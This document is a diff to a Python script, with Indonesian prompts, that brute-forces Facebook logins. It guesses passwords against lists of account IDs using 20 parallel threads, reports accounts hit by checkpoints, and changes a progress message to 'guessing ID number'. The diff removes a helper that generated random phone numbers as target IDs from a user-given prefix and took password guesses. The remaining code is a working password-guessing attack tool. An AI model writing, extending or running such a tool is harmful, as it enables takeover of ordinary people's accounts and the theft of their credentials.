@@ -32,24 +32,10 @@ def login(email, pasw):
         elif 'www.facebook.com' in response.json()['error_msg']:
             print(f'\n{P}    -> {M}CP{P}: {email} --> {ps}')
             break
-    print(f'\r    -> ID Ke {str(count)}', end='', flush=True)
-
-def indo():
-    nomer = []
-    angka_awal = input('    -> Angka Awal:  ')
-    jumlah = int(input('    -> Jumlah: '))
-    for x in range(jumlah):
-        n = random.randint(10000000, 99999999)
-        no = angka_awal+str(n)
-        nomer.append(no)
-    tebakan = input('    -> Tebakan: ').split(',')
-    start(nomer, tebakan)
+    print(f'\r    -> Menebak ID Ke {str(count)}', end='', flush=True)
 def start(list_id, list_pass):
     global count
     with ThreadPoolExecutor(max_workers=20) as th:
         for x in list_id:
             th.submit(login, (x.replace('\n', '')), (list_pass))
     print('    -> Selesai')
-
-if __name__ == '__main__':
-    indo()
